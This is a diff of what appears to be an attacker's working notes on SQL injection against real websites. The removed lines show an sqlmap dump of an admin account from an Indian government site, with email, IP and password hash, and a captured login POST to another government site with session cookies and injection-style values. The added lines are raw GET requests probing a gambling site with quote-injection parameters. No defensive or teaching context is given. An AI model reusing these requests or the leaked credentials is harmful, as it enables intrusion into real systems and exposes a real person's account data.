@@ -1,32 +1,32 @@
-====================
-https://coa.gov.in/app/admin/login.php
+GET /member/gameNotice/findgameNotice?deviceType=1&1''=1 HTTP/1.1
+Host: 8083331.vip
+Accept-Encoding: gzip, deflate
+Accept: application/json, text/plain, */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Authorization: undefined
+Referer: https://8083331.vip/
+deviceInfo: {"mobile":"Chrome 113.0.5672.127","os":"Windows 113.0.5672.127","browser":"Chrome"}
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="113", "Chromium";v="113"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
 
-[15:17:24] [INFO] starting 8 processes
-[15:17:32] [WARNING] no clear password(s) found
-Database: coa_30
-Table: app_admin
-[1 entry]
-+---------+------------+-----------------------------+---------+----------------+----------+----------+----------+----------------------------------+---------------------+
-| user_id | session_id | email                       | clr_pwd | ip_addr        | status   | entry_by | username | password                         | entry_date          |
-+---------+------------+-----------------------------+---------+----------------+----------+----------+----------+----------------------------------+---------------------+
-| 1       | 29532648   | sanjaykumar_comat@yahoo.com |         | 42.108.169.152 | Active   | 0        | admin    | 95228f3702f78bbb4cbbd356a01a5e2b | 2023-09-01 11:47:03 |
-+---------+------------+-----------------------------+---------+----------------+----------+----------+----------+----------------------------------+---------------------+
 
-[15:17:32] [INFO] table 'coa_30.app_admin' dumped to CSV file '/var/root/.local/share/sqlmap/output/coa.gov.in/dump/coa_30/app_admin.csv'
-[15:17:32] [INFO] fetched data logged to text files under '/var/root/.local/share/sqlmap/output/coa.gov.in'
 
-====================
+GET /member/gameNotice/findgameNotice?deviceType=1&1'=1 HTTP/1.1
+Host: 8083331.vip
+Accept-Encoding: gzip, deflate
+Accept: application/json, text/plain, */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Authorization: undefined
+Referer: https://8083331.vip/
+deviceInfo: {"mobile":"Chrome 113.0.5672.127","os":"Windows 113.0.5672.127","browser":"Chrome"}
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="113", "Chromium";v="113"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
 
-POST /oth_login.aspx HTTP/1.1
-X-Requested-With: XMLHttpRequest
-Referer: http://agriculture.up.gov.in/
-Cookie: ASP.NET_SessionId=1mrxbkpqm1v1fsj12rdvqkbe; __AntiXsrfToken=e9d20371e2d949e29b15ca47df8a3a9a
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 3669
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Encoding: gzip,deflate,br
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
-Host: agriculture.up.gov.in
-Connection: Keep-alive
-
-__EVENTARGUMENT=1&__EVENTTARGET=1&__PREVIOUSPAGE=VLGfFKKWvNv8pJQoh9qGQ04Ak-PO8EPgyOvLNFfZlNcy_zYPIfghxIWXOlKjuYWqnq8_akm4WoRsOJKkWtJA8hlTq1rd_Q6VELo_nqw6Yzw1&__VIEWSTATE=/wEPDwUKMTU1MjUzOTkyNw9kFgJmD2QWAgIDD2QWAgIDD2QWBgIBDxAPFgYeDURhdGFUZXh0RmllbGQFCGRpc3RuYW1lHg5EYXRhVmFsdWVGaWVsZAUIZGlzdGNvZGUeC18hRGF0YUJvdW5kZ2QQFU0DQUxMDOCkhuCkl%2BCksOCkvhLgpIXgpLLgpYDgpJfgpKLgpLwb4KSq4KWN4KSw4KSv4KS%2B4KSX4KSw4KS%2B4KScIeCkheCkruCljeCkrOClh%2BCkoeCkleCksOCkqOCkl%2BCksA/gpIXgpK7gpYfgpKDgpYAP4KSU4KSw4KWI4KSv4KS%2BD%2BCkhuCknOCkruCkl%2BCkog/gpKzgpL7gpJfgpKrgpKQS4KSs4KS54KSw4KS%2B4KSH4KSaD%2BCkrOCksuCkv%2BCkr%2BCkvhjgpKzgpLLgpLDgpL7gpK7gpKrgpYHgpLAP4KSs4KS%2B4KSC4KSm4KS%2BGOCkrOCkvuCksOCkvuCkrOCkguCkleClgA/gpKzgpLDgpYfgpLLgpYAP4KSs4KS44KWN4KSk4KWAEuCkrOCkv%2BCknOCkqOCljOCksBLgpKzgpKbgpL7gpK/gpYLgpIEb4KSs4KWB4KSy4KSo4KWN4KSm4KS24KS54KSwFeCkmuCkqOCljeCkpuCljOCksuClgBjgpJrgpL/gpKTgpY3gpLDgpJXgpYLgpJ8V4KSm4KWH4KS14KSw4KS/4KSv4KS%2BCeCkj%2BCkn%2BCkvg/gpIfgpJ/gpL7gpLXgpL4V4KSF4KSv4KWL4KSn4KWN4KSv4KS%2BHuCkq%2BCksOCljeCksOClgeCkluCkvuCkrOCkvuCkphXgpKvgpKTgpYfgpLngpKrgpYHgpLAb4KSr4KS/4KSw4KWL4KSc4KS%2B4KSs4KS%2B4KSmFeCkl%2BCkvuCknOClgOCkquClgeCksCXgpJfgpYzgpKTgpK7gpKzgpYHgpKbgpY3gpLUg4KSo4KSX4KSwG%2BCkl%2BCkvuCknOCkv%2BCkr%2BCkvuCkrOCkvuCkphLgpJfgpYvgpKPgpY3gpKHgpL4V4KSX4KWL4KSw4KSW4KSq4KWB4KSwFeCkueCkruClgOCksOCkquClgeCksBLgpLngpL7gpKrgpYHgpKHgpLwP4KS54KSw4KSm4KWL4KSID%2BCknOCkvuCksuCljOCkqBLgpJzgpYzgpKjgpKrgpYHgpLAP4KSd4KS%2B4KSB4KS44KWAEuCkheCkruCksOCli%2BCkueCkvhLgpJXgpKjgpY3gpKjgpYzgpJwi4KSV4KS%2B4KSo4KSq4KWB4KSwIOCkpuClh%2BCkueCkvuCkpBzgpJXgpL7gpKjgpKrgpYHgpLAg4KSo4KSX4KSwEuCkleCkvuCkuOCkl%2BCkguCknBjgpJXgpYzgpLbgpL7gpK7gpY3gpKzgpYAV4KSV4KWB4KS24KWA4KSo4KSX4KSwIuCksuCkluClgOCkruCkquClgeCksC3gpJbgpYDgpLDgpYAV4KSy4KSy4KS/4KSk4KSq4KWB4KSwDOCksuCkluCkqOCkig/gpLngpL7gpKXgpLDgpLgY4KSu4KS54KSw4KS%2B4KSc4KSX4KSC4KScD%2BCkruCkueCli%2BCkrOCkvhXgpK7gpYjgpKjgpKrgpYHgpLDgpYAP4KSu4KSl4KWB4KSw4KS%2BBuCkruCkigzgpK7gpYfgpLDgpKAb4KSu4KS/4KSw4KWN4KSc4KS%2B4KSq4KWB4KSwG%2BCkruClgeCksOCkvuCkpuCkvuCkrOCkvuCkph7gpK7gpYHgpJzgpKvgpY3gpKvgpLDgpKjgpJfgpLAV4KSq4KWA4KSy4KWA4KSt4KWA4KSkG%2BCkquCljeCksOCkpOCkvuCkquCkl%2BCkouCkvBjgpLDgpL7gpK/gpKzgpLDgpYfgpLLgpYAS4KSw4KS%2B4KSu4KSq4KWB4KSwGOCkuOCkueCkvuCksOCkqOCkquClgeCksA/gpLjgpK7gpY3gpK3gpLIi4KS44KSo4KWN4KSk4KSV4KSs4KWA4KSwIOCkqOCkl%2BCksA/gpK3gpKbgpYvgpLngpYAe4KS24KS%2B4KS54KSc4KS54KS%2B4KSB4KSq4KWB4KSwD%2BCktuCkvuCkruCksuClgBvgpLbgpY3gpLDgpL7gpLXgpLjgpY3gpKTgpYAk4KS44KS/4KSn4KWN4KSm4KS%2B4KSw4KWN4KSl4KSo4KSX4KSwFeCkuOClgOCkpOCkvuCkquClgeCksBXgpLjgpYvgpKjgpK3gpKbgpY3gpLAe4KS44KWB4KSy4KWN4KSk4KS%2B4KSo4KSq4KWB4KSwEuCkieCkqOCljeCkqOCkvuCktRXgpLXgpL7gpLDgpL7gpKPgpLjgpYAKTFVDS05PVy1KQhVNA0FMTAE0AjcxAjE0AjQzAjY5AjU0AjM1AjUzAjI1AjM3AjQ5AjU1AjI3ATYCMzECNTYCNzkCMTECNzgCMzICMzMCNzICMTMCMjQCMTICNTcCNTgCMzgCNDcCMTACMjYCMTkCNTkCODACNjACMjECMzYCNzYCNDYCNjECNzUCMjACNzMCNDQCNDECMTYCNjMCMjICNzQCMzACNDIBNQI0NQI4MQEyAjgyATkBMwI3NwIyMwI2NAI2NQExAjcwAjUwAjM5AjY2AjUyAjQ4AjI5AjY3AjQwAjI4AjY4AjE3AzEwMBQrA01nZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2RkAgMPD2QWAh4Gb25ibHVyBThqYXZhc2NyaXB0OmhhbmRsZVNxbCgnQ29udGVudFBsYWNlSG9sZGVyMV90eHRfdXNlcm5hbWUnKWQCBw8PZBYCHwMFOGphdmFzY3JpcHQ6aGFuZGxlU3FsKCdDb250ZW50UGxhY2VIb2xkZXIxX3R4dF9wYXNzd29yZCcpZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUMY3RsMDAkSW1hZ2Uxp8ILkkpxuPByMu7aC8MBc16Tje/8vKKlJ7UNEU7Lwxs=&__VIEWSTATEGENERATOR=EAEF28BB&ctl00%24ContentPlaceHolder1%24btn_login=%E0%A4%B2%E0%A5%89%E0%A4%97%20%E0%A4%87%E0%A4%A8&ctl00%24ContentPlaceHolder1%24ddl_dist=ALL&ctl00%24ContentPlaceHolder1%24txt_password=-1*&ctl00%24ContentPlaceHolder1%24txt_username=pHqghUme&ctl00%24Image1=1
